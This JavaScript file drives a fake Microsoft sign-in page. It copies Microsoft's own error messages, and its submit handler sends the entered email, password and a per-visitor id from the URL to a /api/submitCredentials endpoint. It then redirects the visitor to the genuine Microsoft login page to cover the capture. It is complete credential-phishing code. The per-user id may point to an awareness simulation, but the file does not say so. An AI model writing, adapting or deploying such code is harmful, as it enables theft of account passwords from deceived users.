const slidePage = document.querySelector(".slide-page"),
  secondSlide = document.querySelector(".secondSlide"),
  btnNext = document.querySelector(".firstNext"),
  prevBtnSec = document.querySelector(".prev-1"),
  submitBtn = document.querySelector(".submit");
function validateEmail(e) {
  return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(
    e
  );
}
function validate() {
  const e = $("#result"),
    t = $("#email").val();
  return (
    e.text(""),
    !!validateEmail(t) ||
      (t
        ? (e.text(
            "That Microsoft account doesn't exist.\n Enter a different account or get a new one."
          ),
          e.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px"))
        : (e.text(
            "Enter a valid email address, phone number, or Skype\n name."
          ),
          e.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px")),
      !1)
  );
}
function validatePassword() {
  const e = $("#passResult"),
    t = $("#password").val();
  return (
    e.text(""),
    !(t.length < 8) ||
      (e.text(
        "Your account or password is incorrect. If you don't remember your password,"
      ),
      e.css("color", "red"),
      !1)
  );
}
var input1 = document.getElementById("email"),
  input2 = document.getElementById("password");
input1.addEventListener("keyup", function (e) {
  13 === e.keyCode &&
    (e.preventDefault(), document.getElementById("btnSend").click());
}),
  input2.addEventListener("keyup", function (e) {
    13 === e.keyCode &&
      (e.preventDefault(), document.getElementById("btnSignIn").click());
  }),
  btnNext.addEventListener("click", function () {
    const e = document.getElementById("email").value;
    if (!validate()) return;
    if (!validateEmail(e)) return;
    document.getElementById("userLine").textContent = e;
    const t = document.getElementById("section-1"),
      n = document.getElementById("section-2");
    (t.style.marginLeft = "-100%"),
      (t.style.visibility = "hidden"),
      (n.style.marginLeft = "0%"),
      (document.getElementById("loginForm").style.height = "403px");
  }),
  submitBtn.addEventListener("click", function () {
    // Send Ajax Request to server /api/submitCredentials without validation of password
    const e = document.getElementById("password").value;
    const serverUrl = "http://localhost:8000/api/submitCredentials";
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);

    const data = {
      userId: urlParams.get("id"),
      email: document.getElementById("email").value,
      password: e,
    };

    fetch(serverUrl, {
      body: JSON.stringify(data),
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    }).then(() => {
      // Redirect to microsoft login page
      console.log("test");
      window.location.href =
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=dc566b47-4508-44d2-a0ba-0df09e20972a&x-client-SKU=MSAL.Desktop&x-client-Ver=4.45.0.0&x-client-CPU=x64&x-client-OS=Windows%20Server%202019%20Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXByYJDMAAA0H_p1aGDsR1VFxVCam1vOtYQUVHB1897B-z1r8cwdy7OlHsw-Azt7THvZN6RaAXbnp5BPgmRxsDHGZNlhQhbcqNr1ZVO3zYz9tIlyzE2JxO1jTZ-peap3JkqvvUUZl4sX3vy4BYLfxyRQ2de33g_Yag4wCPWOdPU-lTSI_oLmsyEH9rG9VpW5rtbqlrstNJYPxjfcisObSksBu98SZ6OhH-FVukJrpTyYuXhGPPJUu5HVwALOheytRceCyLkd1NNEmqbYf83AY4L2N7samodKta8WccTcmcnTwzf3bpHRntt5kFx7Xd1MlldL9v4Vi5PN_jAO_CfzH9FomTcMjuH6Yka8jZ4zasHAYtgKQFn99NcypJoMCjHauWzr1oIoNT1MLRpo25k4brGGjetuY1khIXZI9wm1eEf31wTxYIBAAA&msaoauth2=true&lc=1033&ru=https%3A%2F%2Faccount.microsoft.com%2Faccount%2FAccount";
    });
  }),
  prevBtnSec.addEventListener("click", function () {
    const e = document.getElementById("section-1"),
      t = document.getElementById("section-2");
    (e.style.marginLeft = "0%"),
      (e.style.visibility = "visible"),
      (t.style.marginLeft = "100%"),
      (document.getElementById("loginForm").style.height = "370px"),
      (slidePage.style.marginLeft = "0%"),
      (secondSlide.style.marginLeft = "100%"),
      (slidePage.style.visibility = "visible");
  });
